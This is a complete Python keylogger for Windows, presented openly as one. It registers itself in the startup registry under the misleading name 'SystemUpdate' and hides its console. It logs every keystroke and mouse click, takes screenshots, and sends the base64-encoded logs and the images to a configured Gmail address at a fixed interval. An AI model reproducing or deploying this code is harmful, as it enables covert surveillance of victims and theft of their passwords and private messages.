import os
import sys
import time
import random
import base64
import smtplib
import string
import winreg
from pynput import keyboard, mouse
import pyautogui
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders

# ===========================
# CONFIGURATION
# ===========================
YOUR_GMAIL = "your_email@gmail.com"      # Enter your Gmail address
YOUR_GMAIL_PASS = "your_app_password"    # Use an App Password (DO NOT use your real password)
SEND_TO = "receiver_email@gmail.com"     # Email where logs should be sent
INTERVAL = 60  # Time interval (in seconds) before sending logs

# ===========================
# GLOBAL VARIABLES
# ===========================
log_data = ""
screenshot_names = []
start_time = time.time()

# ===========================
# ADD TO STARTUP (PERSISTENCE)
# ===========================
def add_to_startup():
    file_path = os.path.abspath(sys.argv[0])
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_ALL_ACCESS)
    winreg.SetValueEx(key, "SystemUpdate", 0, winreg.REG_SZ, file_path)
    winreg.CloseKey(key)

# ===========================
# HIDE CONSOLE WINDOW
# ===========================
def hide_console():
    import win32console
    import win32gui
    win = win32console.GetConsoleWindow()
    win32gui.ShowWindow(win, 0)

# ===========================
# TAKE SCREENSHOTS
# ===========================
def take_screenshot():
    global screenshot_names
    filename = ''.join(random.choices(string.ascii_uppercase + string.digits, k=7)) + ".png"
    pyautogui.screenshot().save(filename)
    screenshot_names.append(filename)

# ===========================
# SEND LOGS VIA EMAIL
# ===========================
def send_email(log_data, screenshot_names):
    try:
        msg = MIMEMultipart()
        msg["From"] = YOUR_GMAIL
        msg["To"] = SEND_TO
        msg["Subject"] = "New Keylogger Data"

        body = f"Base64 Encoded Keystrokes:\n{base64.b64encode(log_data.encode()).decode()}"
        msg.attach(MIMEText(body, "plain"))

        # Attach screenshots
        for screenshot in screenshot_names:
            attachment = open(screenshot, "rb")
            part = MIMEBase("application", "octet-stream")
            part.set_payload(attachment.read())
            encoders.encode_base64(part)
            part.add_header("Content-Disposition", f"attachment; filename={screenshot}")
            msg.attach(part)
            attachment.close()
            os.remove(screenshot)  # Delete screenshot after sending

        # Send Email
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(YOUR_GMAIL, YOUR_GMAIL_PASS)
        server.sendmail(YOUR_GMAIL, SEND_TO, msg.as_string())
        server.quit()

        print("[+] Logs Sent Successfully!")

    except Exception as e:
        print(f"[-] Failed to send email: {e}")

# ===========================
# KEYBOARD EVENT HANDLER
# ===========================
def on_key_press(key):
    global log_data, start_time
    try:
        log_data += f"[{time.strftime('%H:%M:%S')}] Key: {key.char}\n"
    except AttributeError:
        log_data += f"[{time.strftime('%H:%M:%S')}] Special Key: {key}\n"

    if len(log_data) > 500:
        with open("logfile.txt", "a") as f:
            f.write(log_data)
        log_data = ""

    if time.time() - start_time >= INTERVAL:
        send_email(log_data, screenshot_names)
        log_data = ""
        start_time = time.time()

# ===========================
# MOUSE EVENT HANDLER
# ===========================
def on_click(x, y, button, pressed):
    global log_data
    if pressed:
        log_data += f"[{time.strftime('%H:%M:%S')}] Mouse Click at {x}, {y} with {button}\n"
        if len(log_data) > 300:
            take_screenshot()

# ===========================
# START KEYLOGGER
# ===========================
def start_keylogger():
    add_to_startup()
    hide_console()

    keyboard_listener = keyboard.Listener(on_press=on_key_press)
    mouse_listener = mouse.Listener(on_click=on_click)

    keyboard_listener.start()
    mouse_listener.start()

    keyboard_listener.join()
    mouse_listener.join()

# Run the keylogger
start_keylogger()
